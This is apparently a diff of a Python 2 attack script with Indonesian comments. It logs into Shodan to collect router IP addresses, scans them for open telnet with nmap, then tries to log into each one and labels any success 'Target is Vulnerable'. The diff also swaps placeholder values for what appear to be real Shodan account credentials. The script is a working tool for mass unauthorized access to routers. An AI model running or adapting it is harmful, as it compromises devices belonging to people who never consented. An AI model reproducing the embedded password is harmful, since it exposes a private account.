@@ -23,8 +23,8 @@ dk.set_handle_robots(False)
 dk.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
 sign_in = dk.open("https://account.shodan.io/login")
 dk.select_form(nr = 0)
-dk["username"] = "blabla" #username shodan account
-dk["password"] = "blabla" #password shodan account
+dk["username"] = "colisehat" #username shodan account
+dk["password"] = "jangancolimulu" #password shodan account
 logged_in = dk.submit()
 
 ## Buat file.txt dulu, buat nanti setor IP.
@@ -49,7 +49,7 @@ while maxPage <= 5:
 doofile.close()
 print "[+] Done..!!! File saved in /root/Desktop/RouterIP.txt"
 
-print "[+] Checking Telnet Open Port..."
+print "[+] Scanning Telnet Port..."
 os.system("nmap -T5 -vv -iL /root/Desktop/RouterIP.txt -p 23 | grep 'Discovered open port' | awk {'print $6'} | awk -F/ {'print $1'} > /root/Desktop/IP.txt")
 print "[+] Saved in /root/Desktop/IP.txt"
 
@@ -66,7 +66,7 @@ for ipx in iplist:
 		tn.write("exit\n")
 		#print tn.read_all()
 		tn.close()
-		print ipx,'... Login Success.. Target is vulnerable'
+		print ipx,'...Login Success !!! Target is Vulnerable'
 	except Exception, e:
-		print ipx, e, '... Not Vulnerable'
+		print ipx, e, '...Not Vulnerable'
 		continue
